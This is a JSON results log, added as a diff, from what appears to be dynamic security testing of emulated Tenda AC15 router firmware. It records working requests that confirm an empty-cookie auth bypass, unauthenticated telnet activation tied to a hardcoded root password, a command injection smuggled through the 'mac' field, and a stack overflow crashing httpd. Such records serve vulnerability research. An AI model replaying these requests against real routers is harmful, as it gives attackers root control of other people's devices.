@@ -1,0 +1,217 @@
+{
+  "metadata": {
+    "target": "Tenda AC15 V15.03.05.19 (QEMU emulated)",
+    "category": "firmware",
+    "phase": "Phase 3 - Dynamic Validation",
+    "script": "phase3_dynamic_validation",
+    "start_time": "2026-03-04T05:35:38.817530+00:00",
+    "end_time": "2026-03-04T05:35:51.980108+00:00",
+    "version": "2.0"
+  },
+  "summary": {
+    "total_tests": 11,
+    "total_findings": 4,
+    "total_anomalies": 0,
+    "findings_by_severity": {
+      "CRITICAL": 4,
+      "HIGH": 0,
+      "MEDIUM": 0,
+      "LOW": 0,
+      "INFO": 0
+    },
+    "pass_count": 10,
+    "fail_count": 0
+  },
+  "tests": [
+    {
+      "id": "T001",
+      "description": "Basic connectivity to http://[REDACTED-INTERNAL-IP]:80",
+      "timestamp": "2026-03-04T05:35:38.821532+00:00",
+      "request": {
+        "raw": "GET / HTTP/1.0"
+      },
+      "response": {
+        "raw": "HTTP 302, Server: Http Server"
+      },
+      "result": "PASS",
+      "notes": "httpd responding on [REDACTED-INTERNAL-IP]:80"
+    },
+    {
+      "id": "T002",
+      "description": "Auth bypass via empty password cookie",
+      "timestamp": "2026-03-04T05:35:38.845544+00:00",
+      "request": {
+        "raw": "POST /goform/SetFirewallCfg, Cookie: password="
+      },
+      "response": {
+        "raw": "HTTP 200"
+      },
+      "result": "PASS",
+      "notes": "Empty cookie: 200, No cookie: 302, Wrong: 200"
+    },
+    {
+      "id": "T003",
+      "description": "[REDACTED-ID]_002 Unauthenticated telnet activation",
+      "timestamp": "2026-03-04T05:35:46.853546+00:00",
+      "request": {
+        "raw": "POST /goform/telnet (no cookie, no auth)"
+      },
+      "response": {
+        "raw": "HTTP 0"
+      },
+      "result": "PASS",
+      "notes": "No authentication required. Confirmed via strace: execve('/bin/sh',{'sh','-c','killall -9 telnetd'}) + execve('/bin/sh',{'sh','-c','telnetd -b <ip> &'})"
+    },
+    {
+      "id": "T_UNAUTH_CF6-013",
+      "description": "Unauthenticated access to /goform/GetRouterStatus",
+      "timestamp": "2026-03-04T05:35:46.877558+00:00",
+      "request": {
+        "raw": "GET /goform/GetRouterStatus (no cookie)"
+      },
+      "response": {
+        "raw": "HTTP 302, body: <html><head></head><body>\r\n\t\tThis document has moved to a new <a href=\"http://[REDACTED-INTERNAL-IP]/goform/Get"
+      },
+      "result": "PASS",
+      "notes": "No authentication required for Router status info"
+    },
+    {
+      "id": "T_UNAUTH_CF6-014",
+      "description": "Unauthenticated access to /goform/getWanParameters",
+      "timestamp": "2026-03-04T05:35:46.881560+00:00",
+      "request": {
+        "raw": "GET /goform/getWanParameters (no cookie)"
+      },
+      "response": {
+        "raw": "HTTP 302, body: <html><head></head><body>\r\n\t\tThis document has moved to a new <a href=\"http://[REDACTED-INTERNAL-IP]/goform/get"
+      },
+      "result": "PASS",
+      "notes": "No authentication required for WAN parameters"
+    },
+    {
+      "id": "T_UNAUTH_CF6-022",
+      "description": "Unauthenticated access to /goform/GetUSBStatus",
+      "timestamp": "2026-03-04T05:35:46.881560+00:00",
+      "request": {
+        "raw": "GET /goform/GetUSBStatus (no cookie)"
+      },
+      "response": {
+        "raw": "HTTP 302, body: <html><head></head><body>\r\n\t\tThis document has moved to a new <a href=\"http://[REDACTED-INTERNAL-IP]/goform/Get"
+      },
+      "result": "PASS",
+      "notes": "No authentication required for USB status"
+    },
+    {
+      "id": "T_UNAUTH_CF6-023",
+      "description": "Unauthenticated access to /goform/getRebootStatus",
+      "timestamp": "2026-03-04T05:35:46.881560+00:00",
+      "request": {
+        "raw": "GET /goform/getRebootStatus (no cookie)"
+      },
+      "response": {
+        "raw": "HTTP 200, body: ({\"status\":\"success\"})\n"
+      },
+      "result": "PASS",
+      "notes": "No authentication required for Reboot status"
+    },
+    {
+      "id": "T_UNAUTH_SCAN",
+      "description": "Unauthenticated access to /goform/WifiApScan",
+      "timestamp": "2026-03-04T05:35:46.881560+00:00",
+      "request": {
+        "raw": "GET /goform/WifiApScan (no cookie)"
+      },
+      "response": {
+        "raw": "HTTP 302, body: <html><head></head><body>\r\n\t\tThis document has moved to a new <a href=\"http://[REDACTED-INTERNAL-IP]/goform/Wif"
+      },
+      "result": "PASS",
+      "notes": "No authentication required for WiFi AP scan"
+    },
+    {
+      "id": "T004",
+      "description": "[REDACTED-ID]_004 formWriteFacMac command injection",
+      "timestamp": "2026-03-04T05:35:48.942590+00:00",
+      "request": {
+        "raw": "POST /goform/WriteFacMac, Cookie: password=, body: mac=;echo CF6PROOF > /tmp/cf6_proof.txt"
+      },
+      "response": {
+        "raw": "HTTP 0, proof file created"
+      },
+      "result": "PASS",
+      "notes": "Command injection confirmed: echo CF6PROOF > /tmp/cf6_proof.txt"
+    },
+    {
+      "id": "T005",
+      "description": "[REDACTED-ID]_001 formSetFirewallCfg stack BOF",
+      "timestamp": "2026-03-04T05:35:51.980108+00:00",
+      "request": {
+        "raw": "POST /goform/SetFirewallCfg, firewallEn=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+      },
+      "response": {
+        "raw": "HTTP 200, then httpd crashed"
+      },
+      "result": "PASS",
+      "notes": "httpd crashed after 200-byte overflow. Baseline was stable."
+    },
+    {
+      "id": "T006",
+      "description": "[REDACTED-ID]_005 formWifiBasicSet BOF",
+      "timestamp": "2026-03-04T05:35:51.980108+00:00",
+      "request": {},
+      "response": {},
+      "result": "SKIP",
+      "notes": ""
+    }
+  ],
+  "findings": [
+    {
+      "id": "[REDACTED-ID]_005-AUTH",
+      "severity": "CRITICAL",
+      "title": "Default Empty Admin Password Bypass - DYNAMICALLY CONFIRMED",
+      "description": "All 'authenticated' endpoints accept Cookie: password= because default sys.userpass is empty. Effectively all endpoints are unauthenticated.",
+      "evidence": "empty_cookie=200 no_cookie=302 wrong_cookie=200",
+      "impact": "Complete admin access to all router functions",
+      "cwe": "CWE-1393: Use of Default Password",
+      "cvss": "9.8",
+      "remediation": "",
+      "timestamp": "2026-03-04T05:35:38.845544+00:00"
+    },
+    {
+      "id": "[REDACTED-ID]_002",
+      "severity": "CRITICAL",
+      "title": "Unauthenticated Remote Telnet Activation - DYNAMICALLY CONFIRMED",
+      "description": "POST /goform/telnet triggers system('killall -9 telnetd') + doSystemCmd('telnetd -b %s &') WITHOUT authentication. Endpoint is in R7WebsSecurityHandler whitelist. Combined with hardcoded root:$1$OVhtCyFa$ password = immediate root shell.",
+      "evidence": "HTTP 0, strace confirmed execve of telnetd commands",
+      "impact": "Complete device compromise - root shell access",
+      "cwe": "CWE-306: Missing Authentication for Critical Function",
+      "cvss": "9.8",
+      "remediation": "",
+      "timestamp": "2026-03-04T05:35:46.853546+00:00"
+    },
+    {
+      "id": "[REDACTED-ID]_004",
+      "severity": "CRITICAL",
+      "title": "Command Injection in formWriteFacMac - FILE CREATION CONFIRMED",
+      "description": "doSystemCmd('cfm mac %s', user_input) executes arbitrary OS commands. Proof: mac=;echo CF6PROOF > /tmp/cf6_proof.txt created /tmp/cf6_proof.txt with content 'CF6PROOF'.",
+      "evidence": "Proof file /tmp/cf6_proof.txt created successfully",
+      "impact": "Arbitrary command execution as root",
+      "cwe": "CWE-78: OS Command Injection",
+      "cvss": "8.8",
+      "remediation": "",
+      "timestamp": "2026-03-04T05:35:48.942590+00:00"
+    },
+    {
+      "id": "[REDACTED-ID]_001",
+      "severity": "CRITICAL",
+      "title": "Stack Buffer Overflow in formSetFirewallCfg - CRASH CONFIRMED",
+      "description": "Sending 200-byte firewallEn parameter crashes httpd. strcpy(fp-0x34, user_input) overflows 56-byte buffer to saved LR. No stack canary + no PIE = deterministic return address control. Additionally, 11 doSystemCmd('iptables...%s...') calls in same function provide command injection surface.",
+      "evidence": "Baseline HTTP 200 stable, overflow HTTP 200 then crash",
+      "impact": "Remote code execution as root",
+      "cwe": "CWE-121: Stack-based Buffer Overflow",
+      "cvss": "8.8",
+      "remediation": "",
+      "timestamp": "2026-03-04T05:35:51.980108+00:00"
+    }
+  ],
+  "anomalies": []
+}
